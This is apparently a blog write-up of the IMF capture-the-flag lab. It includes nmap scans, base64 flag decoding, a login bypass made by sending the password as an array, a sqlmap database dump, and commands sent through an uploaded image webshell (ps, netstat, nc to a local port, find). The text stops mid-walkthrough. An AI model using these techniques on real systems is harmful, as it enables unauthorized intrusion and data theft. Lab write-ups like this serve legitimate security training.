---
layout: post
title: imf
---

#IMF

##Finding machine on the network:

###Nmap
nmap -sn 192.168.1.0/24

Scan for hosts on my local network (192.168.1.1) which gave me a machine named "imf"

Now to run nmap on the machine itself:

nmap -Pn -oA imf-nmap-results -p 0-65525 192.168.1.21

Looks like port 80 is open.

After clicking through the pages on the site and viewing their sources I found this: 

<!-- flag1{YWxsdGhlZmlsZXM=} -->

The first flag, having a = at the end looks base64 encoded.

echo YWxsdGhlZmlsZXM= | base64 -d

returns: allthefiles

Something I noticed on the contact page was some random weird named js files:

<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
<script src="js/XUnRhVzVwYzNS.js"></script>
<script src="js/eVlYUnZjZz09fQ==.min.js"></script>

Those all might combine into a base64 string, lets check it out

echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -D

which  returns: flag2{aW1mYWRtaW5pc3RyYXRvcg==}

after running: echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -D

I get:

imfadministrator

I tried browsing to: http://192.168.1.21/imfadministrator

Loads up a login page, upon viewing the page source I find:

<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->


I remembered seeing emails on the contact page, went page and sure enough roger is a user, rmichaels is his email.

Trying the user it seems the user is valid.

After some googling, looks like there is a potential authentication type conversion that might get us around authentication.  Looking at a post changing the type of the data that is received server side could bypass authentication.  Intercepting the HTTP post with burp and changing pass to pass[], this ends up sending an array down to the server instead of a string, improper handling of the input must be how we can get past it.  Once the post is forwarded another flag: flag3{Y29udGludWVUT2Ntcw==} which decodes to: continueTOcms


sqlmap --url http://192.168.1.21/imfadministrator/cms.php?pagename=home --threads 5 --level 5 --cookie="PHPSESSID=phpsessionid" --dbms=MYSQL --dump

Important to remember the last two parameters, I missed these originally and totally didn't get some output for moving forward from the command line.

Another flag: flag4{dXBsb2Fkcjk0Mi5waHA=} which decodes to: uploadr942.php

flag5{YWdlbnRzZXJ2aWNlcw==} which decodes to: agentservices

Running ps -A through the webshell created to get flag5 I'm able to see all the processes running on the remote machine.  One item that loks interesting is knockd, usually this would indicate that a port knocking sequence exists to open a service up to the public.

Running: netstat -vatn shows a list of the processes listening on TCP, 7788 and 22 look interesting 

Trying to knock the default ports (7000 8000 9000)
for x in 7000 8000 9000; do nmap -T4 -p $x 192.168.1.20;done;

No luck though when trying to hit the interesting ports.  

Trying to hit port 7788:

curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=nc localhost 7788

I get a little shell app. Given that we are investigating "agentservice" I do a find on agent:

curl http://192.168.1.20/imfadministrator/uploads/c59ca80d5d76.gif?c=find%20/%20-name%20%22*agent%22


